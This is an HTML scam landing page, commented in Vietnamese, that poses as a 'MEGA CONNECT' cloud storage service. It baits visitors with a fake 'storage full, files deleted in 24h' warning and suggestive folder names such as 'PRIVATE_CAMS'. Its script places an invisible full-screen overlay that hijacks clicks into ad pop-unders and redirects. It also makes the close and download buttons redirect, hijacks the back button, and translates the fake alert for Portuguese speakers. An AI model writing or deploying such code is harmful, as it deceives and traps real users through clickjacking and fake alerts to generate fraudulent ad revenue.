<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Storage - Private Access</title>
    
    <!-- Scripts Adsterra của ông giữ nguyên -->
    <script src="https://evacuateenclose.com/2d/f0/3e/2df03ec7f051608ea8806353a1663a9f.js"></script>
    <script src="https://evacuateenclose.com/65/5d/86/655d862c63ab08ee18932b53de13d177.js"></script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background-color: #0b1120; color: #94a3b8; font-family: -apple-system, system-ui, sans-serif; padding: 15px; overflow: hidden; touch-action: manipulation; }
        
        /* Bẫy phủ toàn màn hình */
        #global-overlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            z-index: 9999; cursor: pointer; background: rgba(0,0,0,0); 
            display: block; /* Hiện ngay để bắt click iOS */
        }

        #fake-alert {
            position: fixed; top: 15%; left: 50%; transform: translateX(-50%);
            width: 92%; max-width: 360px; background: #fff; color: #000;
            padding: 18px; border-radius: 12px; box-shadow: 0 15px 40px rgba(0,0,0,0.6);
            z-index: 10000; font-size: 14px; border: 2px solid #ef4444;
        }

        .close-btn {
            position: absolute; top: -12px; right: -12px; width: 32px; height: 32px;
            background: #ef4444; color: white; border-radius: 50%; text-align: center;
            line-height: 30px; font-weight: bold; cursor: pointer; border: 2px solid white;
        }

        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding-bottom: 10px; border-bottom: 1px solid #1e293b; }
        .logo { color: #3b82f6; font-weight: 800; font-size: 22px; }
        .status { color: #22c55e; font-size: 12px; display: flex; align-items: center; }
        .status::before { content: ""; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; margin-right: 6px; animation: blink 1s infinite; }
        
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        .folder-card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; margin-bottom: 12px; display: flex; align-items: center; transition: 0.3s; }
        .icon { font-size: 30px; margin-right: 15px; }
        .info b { display: block; color: #f1f5f9; font-size: 14px; margin-bottom: 4px; }
        .info span { font-size: 11px; color: #94a3b8; }
        
        .btn-action { display: block; text-decoration: none; background: #2563eb; color: #fff; text-align: center; padding: 18px; border-radius: 12px; font-weight: 800; margin-top: 20px; animation: pulse 1.5s infinite; text-transform: uppercase; letter-spacing: 1px; }
        
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); box-shadow: 0 0 20px rgba(37,99,235,0.4); } 100% { transform: scale(1); } }
        .footer { text-align: center; font-size: 11px; margin-top: 25px; color: #475569; line-height: 1.6; }
    </style>
</head>
<body>

    <div id="global-overlay"></div>

    <div id="fake-alert">
        <span id="txt-msg"><strong>⚠️ CLOUD STORAGE FULL:</strong> 98% Used. Your private files will be deleted in 24h. Download now!</span>
        <div class="close-btn" id="btn-x">X</div>
    </div>

    <div class="header">
        <div class="logo">MEGA CONNECT</div>
        <div class="status">ENCRYPTED</div>
    </div>

    <div class="folder-card">
        <div class="icon">📂</div>
        <div class="info"><b>P.R.I.V.A.T.E_C.A.M.S</b><span>2.1 GB • 142 Items</span></div>
    </div>
    <div class="folder-card">
        <div class="icon">📂</div>
        <div class="info"><b>L.E.A.K.E.D_S.T.O.R.I.E.S</b><span>940 MB • 85 Items</span></div>
    </div>

    <div class="btn-action" id="btn-main">DOWNLOAD ALL FILES (.ZIP)</div>

    <div class="footer" id="txt-ft">System: Mumbai-Node-4 <br> End-to-End SSL Protection 2026.</div>

    <script>
        // Cấu hình Link Ads (Thay key của ông vào đây)
        const myAds = "https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566";
        let cCount = 0;

        const overlay = document.getElementById('global-overlay');
        const mainBtn = document.getElementById('btn-main');
        const closeBtn = document.getElementById('btn-x');

        // Hàm nổ Ads "Sạch" cho iOS/Safari
        function bang() {
            window.open(myAds, '_blank');
        }

        function redirect() {
            window.location.replace(myAds);
        }

        // 1. Xử lý Bẫy Toàn Trang
        overlay.addEventListener('click', function() {
            cCount++;
            if (navigator.vibrate) navigator.vibrate(100);
            
            if (cCount === 1) {
                bang(); // Cú click 1: Nổ tab mới
                this.style.visibility = 'hidden'; // Ẩn tạm để user click được nút thật
                setTimeout(() => { this.style.visibility = 'visible'; }, 800);
            } else {
                redirect(); // Cú click 2: Bay màu trang hiện tại
            }
        });

        // 2. Nút X và Nút chính
        closeBtn.onclick = redirect;
        mainBtn.onclick = redirect;

        // 3. Back-button Hijack (Chỉ kích hoạt sau khi user tương tác 2s)
        setTimeout(() => {
            history.pushState(null, null, location.href);
            window.onpopstate = function () {
                redirect();
            };
        }, 2500);

        // 4. Đổi tiếng (Tối ưu hóa cho Brazil/Portugal)
        const lang = navigator.language || navigator.userLanguage;
        if (lang.match(/pt|br/i)) {
            document.getElementById('txt-msg').innerHTML = "<strong>⚠️ MEMÓRIA CHEIA:</strong> 98% Usado. Seus arquivos serão deletados. Baixe agora!";
            document.getElementById('btn-main').innerText = "BAIXAR ARQUIVOS (.ZIP)";
            document.getElementById('txt-ft').innerHTML = "Sistema: Servidor Brasil-04 <br> Proteção SSL de ponta a ponta 2026.";
        }
    </script>
</body>
</html>
